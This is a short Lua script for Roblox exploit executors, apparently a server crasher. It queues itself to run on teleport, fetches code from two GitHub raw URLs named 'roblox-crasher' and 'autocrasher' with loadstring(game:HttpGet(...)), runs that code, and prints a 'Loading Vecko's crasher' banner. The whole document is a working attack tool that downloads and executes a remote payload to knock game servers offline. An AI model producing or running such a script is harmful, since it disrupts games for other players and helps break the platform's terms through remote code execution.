local ont = syn and syn.queue_on_teleport or queue_on_teleport or fluxus and fluxus.queue_on_teleport or function()
    end
ont("loadstring(game:HttpGet(('https://raw.githubusercontent.com/Korabi-dev/roblox-crasher/main/ah.lua'),true))()")


function log(msg, color) 
if not color then color = "WHITE" end
rconsoleprint("@@"..color:gsub(" ", "_"):upper().."@@")   
rconsoleprint(msg)
end

rconsoleclear()
log("Loading Vecko's crasher....", "red")
repeat task.wait() until game:IsLoaded()
loadstring(game:HttpGet(('https://raw.githubusercontent.com/reloxz/endofAH/main/autocrasher.txt'),true))()
